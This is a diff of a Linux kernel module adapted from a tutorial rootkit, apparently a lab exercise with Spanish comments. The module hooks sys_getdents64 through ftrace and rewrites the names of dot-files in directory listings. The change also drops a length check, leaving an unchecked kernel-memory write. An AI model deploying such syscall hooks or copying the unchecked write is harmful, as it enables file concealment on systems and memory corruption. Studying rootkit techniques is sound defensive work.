@@ -8,8 +8,6 @@
 
 #include "ftrace_helper.h"
 
-#define PREFIX "boogaloo"
-
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("TheXcellerator");
 MODULE_DESCRIPTION("Hiding files that start with a certain prefix");
@@ -30,7 +28,6 @@ MODULE_VERSION("0.02");
  * more modern way is to use the pt_regs struct. */
 #ifdef PTREGS_SYSCALL_STUBS
 static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
-static asmlinkage long (*orig_getdents)(const struct pt_regs *);
 
 /* This is our hooked function for sys_getdents64 */
 asmlinkage int hook_getdents64(const struct pt_regs *regs)
@@ -43,7 +40,7 @@ asmlinkage int hook_getdents64(const struct pt_regs *regs)
     long error;
 
     /* We will need these intermediate structures for looping through the directory listing */
-    struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
+    struct linux_dirent64 *current_dir, *dirent_ker = NULL;
     unsigned long offset = 0;
 
     /* We first have to actually call the real sys_getdents64 syscall and save it so that we can
@@ -62,6 +59,7 @@ asmlinkage int hook_getdents64(const struct pt_regs *regs)
         goto done;
 
     /* We iterate over offset, incrementing by current_dir->d_reclen each loop */
+	// Aqui comienza el bloque modificado por nosotros
     while (offset < ret)
     {
         /* First, we look at dirent_ker + 0, which is the first entry in the directory listing */
@@ -70,19 +68,18 @@ asmlinkage int hook_getdents64(const struct pt_regs *regs)
 		if (current_dir->d_reclen == 0 || offset + current_dir->d_reclen > ret)
             break;
 
-        /* Compare current_dir->d_name to PREFIX */
+        /* Comparamos si el primer digito es un punto, ya que
+		en Linux es un estandar "ocultar" archivos con el punto */
         if (current_dir->d_name[0] == '.')
         {
-            size_t name_len = current_dir->d_reclen - offsetof(typeof(*current_dir), d_name);
-            if (name_len > 6) { // "hidden" is 6 chars + null terminator
-                strncpy(current_dir->d_name, "hidden", 6);
-                current_dir->d_name[6] = '\0';
-            }
+            strncpy(current_dir->d_name, "hidden", 6);
+            current_dir->d_name[6] = '\0';
         }
         /* Increment offset by current_dir->d_reclen, when it equals ret, then we've scanned the whole
          * directory listing */
         offset += current_dir->d_reclen;
     }
+	// Aqui termina el bloque modificado por nosotros
 
     /* Copy our (perhaps altered) dirent structure back to userspace so it can be returned.
      * Note that dirent is already in the right place in memory to be referenced by the integer
